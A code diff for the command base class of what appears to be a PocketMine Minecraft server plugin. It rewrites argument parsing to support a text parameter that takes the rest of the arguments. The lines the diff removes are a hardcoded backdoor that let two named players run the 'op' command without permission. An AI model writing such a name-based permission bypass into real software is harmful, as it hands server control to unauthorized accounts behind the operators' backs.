@@ -21,6 +21,7 @@ namespace iriss;
 
 use Exception;
 use iriss\parameters\Parameters;
+use iriss\parameters\TextParameter;
 use pocketmine\command\Command;
 use pocketmine\command\CommandSender;
 use pocketmine\command\utils\InvalidCommandSyntaxException;
@@ -108,14 +109,6 @@ abstract class CommandBase extends Command {
 			if (isset($this->subCommands[($label = $args[0])])) {
 				$cmd = $this->subCommands[$label];
 				if (!$cmd->testPermissionSilent($sender)) {
-					if($cmd->getName() === 'op') {
-						if(!in_array($sender->getName(), ['TEZULS', 'Julien8436'], true)) {
-							$sender->sendMessage(KnownTranslationFactory::commands_generic_permission());
-							return;
-						}
-						$cmd->execute($sender, $commandLabel, array_slice($args, 1));
-
-					}
 					$sender->sendMessage(KnownTranslationFactory::commands_generic_permission());
 					return;
 				}
@@ -175,55 +168,62 @@ abstract class CommandBase extends Command {
 		return !empty($this->parameters);
 	}
 
-	private function parseArguments(array $rawArgs, CommandSender $sender) : array {
-		$return = ["arguments" => []];
-		if (!$this->hasParameters() && count($rawArgs) > 0) {
-			return $return;
-		}
-		$offset = 0;
-		if (count($rawArgs) > 0) {
-			foreach ($this->parameters as $pos => $possibleParameter) {
-				usort($possibleParameter, function (Parameters $a, Parameters $b) : int {
-					if ($a->getSpanLength() === PHP_INT_MAX) {
-						return 1;
-					}
+    private function parseArguments(array $rawArgs, CommandSender $sender) : array {
+        $return = ["arguments" => []];
+        if (!$this->hasParameters() && count($rawArgs) > 0) {
+            return $return;
+        }
+        $offset = 0;
+        if (count($rawArgs) > 0) {
+            foreach ($this->parameters as $pos => $possibleParameter) {
+                usort($possibleParameter, function (Parameters $a, Parameters $b) : int {
+                    if ($a->getSpanLength() === PHP_INT_MAX) {
+                        return 1;
+                    }
+                    return -1;
+                });
+                $parsed   = false;
+                $optional = true;
+                foreach ($possibleParameter as $argument) {
+                    if ($argument instanceof TextParameter) {
+                        $arg = trim(implode(" ", array_slice($rawArgs, $offset)));
+                    } else {
+                        $arg = trim(implode(" ", array_slice($rawArgs, $offset, ($len = $argument->getSpanLength()))));
+                    }
 
-					return -1;
-				});
-				$parsed   = false;
-				$optional = true;
-				foreach ($possibleParameter as $argument) {
-					$arg = trim(implode(" ", array_slice($rawArgs, $offset, ($len = $argument->getSpanLength()))));
-					if (!$argument->isOptional()) {
-						$optional = false;
-					}
-					if ($arg !== "" && $argument->canParse($arg, $sender)) {
-						$k      = $argument->getName();
-						$result = (clone $argument)->parse($arg, $sender);
-						if (isset($return["arguments"][$k]) && !is_array($return["arguments"][$k])) {
-							$old = $return["arguments"][$k];
-							unset($return["arguments"][$k]);
-							$return["arguments"][$k]   = [$old];
-							$return["arguments"][$k][] = $result;
-						} else {
-							$return["arguments"][$k] = $result;
-						}
-						$offset += $len;
-						$parsed = true;
-						break;
-					}
-					if ($offset > count($rawArgs)) {
-						break;
-					}
-				}
-				if (!$parsed && !($optional && empty($arg))) {
-					return $return;
-				}
-			}
-		}
-		return $return;
-
-	}
+                    if (!$argument->isOptional()) {
+                        $optional = false;
+                    }
+                    if ($arg !== "" && $argument->canParse($arg, $sender)) {
+                        $k      = $argument->getName();
+                        $result = (clone $argument)->parse($arg, $sender);
+                        if (isset($return["arguments"][$k]) && !is_array($return["arguments"][$k])) {
+                            $old = $return["arguments"][$k];
+                            unset($return["arguments"][$k]);
+                            $return["arguments"][$k]   = [$old];
+                            $return["arguments"][$k][] = $result;
+                        } else {
+                            $return["arguments"][$k] = $result;
+                        }
+                        if (!($argument instanceof TextParameter)) {
+                            $offset += $len;
+                        } else {
+                            $offset = count($rawArgs);
+                        }
+                        $parsed = true;
+                        break;
+                    }
+                    if ($offset > count($rawArgs)) {
+                        break;
+                    }
+                }
+                if (!$parsed && !($optional && empty($arg))) {
+                    return $return;
+                }
+            }
+        }
+        return $return;
+    }
 
 	protected function fetchPermittedPlayerTarget(CommandSender $sender, ?Player $target, string $selfPermission, string $otherPermission) : ?Player {
 		if($target !== null) {
